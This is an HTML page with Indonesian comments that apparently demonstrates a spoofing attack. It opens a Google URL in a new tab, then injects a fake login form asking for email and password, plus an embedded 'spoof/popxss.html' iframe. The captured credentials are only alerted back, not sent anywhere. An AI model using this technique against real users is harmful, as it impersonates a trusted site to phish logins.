<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File .txt</title>
    <script>
        function go() {
            // Membuka tab baru dengan URL Google (optional)
            var x = window.open('https://www.google.com/csi', '_blank'); 
            setTimeout(function(){
                // Menambahkan konten di tab yang baru
                x.document.body.innerHTML = 
                    '<h1>Login</h1>' +
                    'Email: <input id="email"><br>' +
                    'Pass: <input id="pass" type="password"><br>' +
                    '<button onclick="alert(\'Email: \'+document.getElementById(\'email\').value+\'\\nPass:\'+document.getElementById(\'pass\').value)">Login</button>' +
                    '<br><br>' +
                    '<button onclick="downloadFile()">Download Text File</button>' + // Tombol untuk download file
                    '<br><br>' +
                    '<a href="https://www.example.com/path/to/your/file.txt" download="file.txt">Download the File</a>' + // Link download
                    '<br><br>' +
                    '<h2>Embedded iFrame Example</h2>' +
                    '<iframe src="https://ecdnts-del.github.io/spoof/popxss.html" width="600" height="400" style="border:1px solid #ccc;"></iframe>' + // Contoh iFrame
                    '<br><br>' +
                    '<h2>Open Apps</h2>' +
                    '<button onclick="openPhoneApp()">Open Phone App</button>' +
                    '<button onclick="openMapsApp()">Open Maps App</button>' +
                    '<button onclick="openEmailApp()">Open Email App</button>';

                // Menambahkan script di dalam tab yang baru untuk membuka aplikasi
                var script = x.document.createElement('script');
                script.innerHTML = `
                    function openPhoneApp() {
                        window.location.href = "tel://123456789"; // Contoh untuk membuka aplikasi Telepon
                    }
                    function openMapsApp() {
                        window.location.href = "maps://"; // Contoh untuk membuka aplikasi Maps
                    }
                    function openEmailApp() {
                        window.location.href = "mailto:test@example.com"; // Contoh untuk membuka aplikasi Mail
                    }
                `;
                x.document.body.appendChild(script); // Menambahkan skrip ke body tab yang baru
            }, 3000); // Menunggu 3 detik sebelum menambahkan konten
        }

        // Fungsi untuk mendownload file dari URL tertentu
        function downloadFile() {
            const fileUrl = 'https://www.example.com/path/to/your/file.txt'; // Ganti dengan URL file yang ingin diunduh

            // Membuat link untuk mendownload file dari URL yang ditentukan
            var link = document.createElement('a');
            link.href = fileUrl;
            link.download = 'file.txt'; // Nama file saat diunduh
            link.click(); // Memulai proses download
        }
    </script>
</head>
<body>
    <button onclick="go()">Go</button> <!-- Tombol untuk membuka tab Google/CSI -->
</body>
</html>
